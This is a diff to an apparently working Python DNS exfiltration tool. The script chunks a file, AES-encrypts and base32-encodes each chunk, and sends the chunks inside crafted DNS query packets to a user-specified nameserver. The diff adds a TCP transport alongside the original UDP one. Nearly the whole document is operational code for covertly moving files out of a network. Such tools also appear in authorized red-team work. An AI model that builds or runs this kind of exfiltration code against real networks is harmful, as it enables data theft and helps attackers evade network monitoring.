@@ -16,12 +16,41 @@ import binascii
 from Crypto.Cipher import AES
 from io import StringIO
 
+# Global vars:
 # Colors:
 red   = colorama.Fore.RED
 cyan  = colorama.Fore.CYAN
 white = colorama.Fore.WHITE
 yellow= colorama.Fore.YELLOW
 reset = colorama.Fore.RESET
+
+# A sample DNS packet we're using as a template for UDP requests.
+HEADER_UDP = b"\x7b\x71\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+# Length of data.
+LENGTH_UDP = b"\x3f"
+# Data.
+DATA_UDP   = b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
+             b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
+             b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
+             b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x62"
+# Rest of stuff here.
+TRAILER_UDP = b"\x08\x6d\x79\x64\x6f\x6d\x61\x69\x6e\x03\x74\x6c\x64\x00\x00\x01\x00\x01"
+
+# A sample DNS packet we're using as a template for TCP requests.
+# Total length of the DNS request.
+T_LENGTH_TCP = b"\x00\x75" 
+HEADER_TCP   = b"\x57\x6f\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01"
+# Length of data.
+LENGTH_TCP   = b"\x3f"
+# Data
+DATA_TCP     = b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
+               b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
+               b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
+               b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+# Rest of stuff here.
+TRAILER_TCP  = b"\x08\x6d\x79\x64\x6f\x6d\x61\x69\x6e\x03\x74\x6c\x64\x00\x00\x01\x00\x01" \
+               b"\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08\xf7" \
+               b"\x01\x7f\x07\x24\x87\xdd\xe3"
 
 class PKCS7Encoder(object):
     """
@@ -45,19 +74,6 @@ class PKCS7Encoder(object):
             output.write('%02x' % val)
         return text + binascii.unhexlify(output.getvalue())
 
-# Global variables:
-# A sample DNS packet we're using as a template.
-HEADER = b"\x7b\x71\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
-# Length of data.
-LENGTH = b"\x3f"
-# Data.
-DATA = b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
-       b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
-       b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
-       b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x62"
-# Rest of stuff here.
-TRAILER = b"\x08\x6d\x79\x64\x6f\x6d\x61\x69\x6e\x03\x74\x6c\x64\x00\x00\x01\x00\x01"
-
 def encrypt(data):
     """
     Encrypts data.
@@ -79,17 +95,29 @@ def encrypt(data):
     cipher_text = base64.b32encode(enc_content)
     return cipher_text
 
-def send_request(data, ns, dns_port):
+def create_socket(ns, dns_port, TCP=False):
+    if(TCP):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    else:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect((ns, dns_port))
+    return s
+
+def send_request(s, data):
     """
     Sends the actual DNS request to the DNS.
     """
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect((ns, dns_port))
-    length = binascii.unhexlify(format(len(data), '02x').replace('0x', '').encode())
-    data = b''.join([char.encode() for char in data])
-    s.send(HEADER+length+data+TRAILER)
-    s.close()
+    if(s.type == 1):
+        # TCP
+        length_TCP   = binascii.unhexlify(format(len(data), '02x').replace('0x', '').encode())
+        t_length_TCP = binascii.unhexlify(format(len(HEADER_TCP+length_TCP+data+TRAILER_TCP), '04x'))
+        s.sendall(t_length_TCP+HEADER_TCP+length_TCP+data+TRAILER_TCP)
+        
+    elif(s.type == 2):
+        # UDP
+        length_UDP = binascii.unhexlify(format(len(data), '02x').replace('0x', '').encode())
+        s.sendall(HEADER_UDP+length_UDP+data+TRAILER_UDP)
 
 def file_to_chunks(path):
     """
@@ -119,17 +147,21 @@ def main():
             help='Delay between sending chunks. This is important for placing chunks in their correct order.')
     parser.add_argument('-p', '--port', action='store', type=int, default=53, dest='dns_port', 
             help='DNS port.')
-
+    parser.add_argument('--tcp', action='store_true', dest='tcp', help='DNS through TCP.')
 
     args = parser.parse_args()
 
     print(f"{yellow}Sending {white}{args.file}{reset}{yellow} with a delay of {white}{args.delay}{reset}{reset}")
 
     chunks = file_to_chunks(args.file)
+    s = create_socket(args.ns, args.dns_port, args.tcp) if args.tcp else create_socket(args.ns, args.dns_port, args.tcp)
     for chunk in chunks:
-        send_request(str(chunk), args.ns, args.dns_port)
+        send_request(s, chunk)
         time.sleep(args.delay)
-    send_request("EOF", args.ns, args.dns_port)
+        if args.tcp:
+            s = create_socket(args.ns, args.dns_port, args.tcp)
+    send_request(s, b"EOF")
+    s.close()
     print(f"{cyan}The file should have been sent.{reset}")
 
 if __name__ == "__main__":
